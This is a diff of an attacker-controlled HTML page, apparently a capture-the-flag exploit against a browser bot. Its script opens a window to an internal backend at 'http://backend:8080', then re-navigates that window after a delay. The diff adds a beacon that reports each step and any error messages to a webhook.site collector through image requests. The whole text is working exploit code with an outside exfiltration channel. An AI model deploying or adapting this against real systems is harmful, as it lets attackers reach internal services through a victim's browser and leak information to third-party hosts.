@@ -4,7 +4,16 @@
 <script>
 const B='http://backend:8080';
 const P='2';
-const w=window.open(B+'/api/content/'+P+'/1','x');
-setTimeout(function(){try{w.location=B+'/api/content/'+P+'/2';}catch(e){}},2500);
+const WH='https://webhook.site/8033ef72-6b18-4fa8-a2f8-8a910a772789/S?';
+function bx(s){ new Image().src=WH+s+'&t='+Date.now(); }
+bx('step=loaded');
+var w;
+try { w=window.open(B+'/api/content/'+P+'/1','x'); bx('step=opened&ok='+(w?1:0)); }
+catch(e){ bx('step=openerr&e='+encodeURIComponent(''+e)); }
+setTimeout(function(){
+  bx('step=confuse');
+  try { w.location=B+'/api/content/'+P+'/2'; bx('step=navdone'); }
+  catch(e){ bx('step=naverr&e='+encodeURIComponent(''+e)); }
+}, 2500);
 </script>
 </body></html>
